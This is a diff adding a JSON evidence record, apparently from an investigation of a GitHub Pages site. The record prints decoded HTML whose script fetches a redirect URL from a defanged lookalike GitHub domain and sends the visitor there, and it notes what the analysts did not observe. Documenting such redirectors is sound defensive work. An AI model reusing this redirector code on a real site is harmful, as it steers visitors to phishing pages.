@@ -1,0 +1,12 @@
+{
+  "captured_at_utc": "2026-09-08T20:45:24.444302+00:00",
+  "source": "https://api.github.com/repos/info-notify/info-notify.github.io/git/blobs/6258cb06dd936c9220713a953048cf7e67db7aa7",
+  "blob_sha": "6258cb06dd936c9220713a953048cf7e67db7aa7",
+  "sha256": "145c146dfc25a864a1f28c8d1095975cbbf7d325177c198701b7990f8efa61c3",
+  "size": 1446,
+  "method": "Fixed Git blob decoded as text; no page JavaScript executed and no target URL followed.",
+  "decoded_sha256": "7ae96917990839cd00f52bb1a2268dc5e5a5ed42f88f450cc8b0a99124178f96",
+  "decoded_text": "<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Loading...</title>\n</head>\n<body>\n    <script>\n        fetch('hxxps://user-github[.]com/generate')\n            .then(response => response.text()) \n            .then(url => {\n                window.location.href = url;\n            })\n            .catch(() => {\n            });\n    </script>\n</body>\n</html>",
+  "mechanism": "Integer character array reconstructs HTML; nested script requests a redirect URL and sets window.location.href to the response. Only integer-to-character decoding performed; script not executed.",
+  "not_observed": "No request to the redirect service or final destination; no credential form or exfiltration on the final page inspected."
+}
